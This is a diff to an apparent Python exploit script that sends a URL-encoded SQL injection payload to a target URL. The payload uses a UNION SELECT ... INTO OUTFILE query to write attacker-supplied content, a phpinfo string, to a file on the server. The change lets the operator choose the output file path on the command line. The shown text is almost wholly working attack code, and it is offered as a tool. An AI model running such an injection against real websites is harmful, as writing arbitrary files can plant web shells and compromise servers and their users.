@@ -8,9 +8,9 @@ import time
 import urllib
 
 banner = '''
-USAGE: python %s <Message>
+USAGE: python %s <File Path>
 
-EXAMPLE: python %s "exploit!"
+EXAMPLE: python %s "/tmp/proof.txt"
 ''' % (sys.argv[0], sys.argv[0])
 
 if(len(sys.argv) != 2):
@@ -30,7 +30,7 @@ header = {
     "Connection": "close",
 }
 
-query = urllib.quote("1')) union select 1,2,'%s' into outfile '/tmp/proof.txt';-- " % phpinfo)
+query = urllib.quote("1')) union select 1,2,'%s' into outfile '%s';-- " % (phpinfo, sys.argv[1]))
 target = url + query
 print("[*] Query: %s" % query)
 print("[*] Creating: %s" % "/tmp/proof.txt")
